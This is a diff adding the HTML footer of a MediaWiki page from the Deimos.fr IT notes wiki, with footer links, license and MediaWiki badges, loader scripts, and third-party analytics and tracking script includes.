+											<li id="footer-places-privacy"><a href="https://wiki.deimos.fr/blocnotesinfo:Privacy_policy" title="blocnotesinfo:Privacy policy">Privacy policy</a></li>
+											<li id="footer-places-about"><a href="https://wiki.deimos.fr/blocnotesinfo:About" title="blocnotesinfo:About">About Deimos.fr / Bloc Notes Informatique</a></li>
+											<li id="footer-places-disclaimer"><a href="https://wiki.deimos.fr/blocnotesinfo:General_disclaimer" title="blocnotesinfo:General disclaimer">Disclaimers</a></li>
+									</ul>
+										<ul id="footer-icons" class="noprint">
+											<li id="footer-copyrightico">
+															<a href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr"><img src="http://i.creativecommons.org/l/by-nc-sa/3.0/88x31.png" alt="Attribution - Pas d’Utilisation Commerciale - Partage dans les Mêmes Conditions 3.0 non transposé" width="88" height="31" /></a>
+													</li>
+											<li id="footer-poweredbyico">
+															<a href="https://www.mediawiki.org/"><img src="resources/assets/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" srcset="resources/assets/poweredby_mediawiki_132x47.png 1.5x, resources/assets/poweredby_mediawiki_176x62.png 2x" width="88" height="31" /></a>
+															<a href="http://www.mediawiki.org/wiki/Extension:SphinxSearch"><img src="extensions/SphinxSearch/skins/images/Powered_by_sphinx.png" alt="Search Powered by Sphinx" width="88" height="31" /></a>
+													</li>
+									</ul>
+						<div style="clear:both"></div>
+		</div>
+		<script>if(window.jQuery)jQuery.ready();</script><script>if(window.mw){
+mw.loader.state({"site":"loading","user":"ready","user.groups":"ready"});
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.toc","mediawiki.action.view.postEdit","mediawiki.user","mediawiki.hidpi","mediawiki.page.ready","mediawiki.searchSuggest"],null,true);
+}</script>
+<script>if(window.mw){
+document.write("\u003Cscript src=\"https://wiki.deimos.fr/load.php?debug=false\u0026amp;lang=en\u0026amp;modules=site\u0026amp;only=scripts\u0026amp;skin=vector\u0026amp;*\"\u003E\u003C/script\u003E");
+}</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-63927289-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<script type="text/javascript" src="https://analytics.example.com/tracking.js"></script><script src="https://js.reactk.com/script/reactk.min.js"></script><script type="text/javascript">reactk.init("B7stJmobgweRBoDZrLflNQpDcgFxET");</script> 
+<script>if(window.mw){
+mw.config.set({"wgBackendResponseTime":31});
+}</script>
+	</body>
+</html>
+	
